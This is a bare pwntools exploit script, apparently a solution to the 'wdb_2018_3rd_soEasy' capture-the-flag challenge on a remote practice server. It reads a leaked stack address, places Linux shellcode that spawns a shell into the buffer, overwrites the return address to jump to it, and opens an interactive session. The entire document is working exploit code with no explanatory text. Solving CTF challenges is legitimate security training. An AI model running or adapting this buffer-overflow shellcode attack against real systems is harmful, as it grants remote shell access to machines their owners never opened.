from pwn import *

context.arch = 'i386'

#p = process('./wdb_2018_3rd_soEasy')
p = remote('node4.buuoj.cn', 25838)

shellcode = asm(shellcraft.sh(), os = 'linux')

p.recvuntil(b'gift->')
buf = int(p.recv(10), 16)

payload = shellcode.ljust(0x48 + 4, b'\x00') + p32(buf)

p.sendlineafter(b'do?\n', payload)

p.interactive()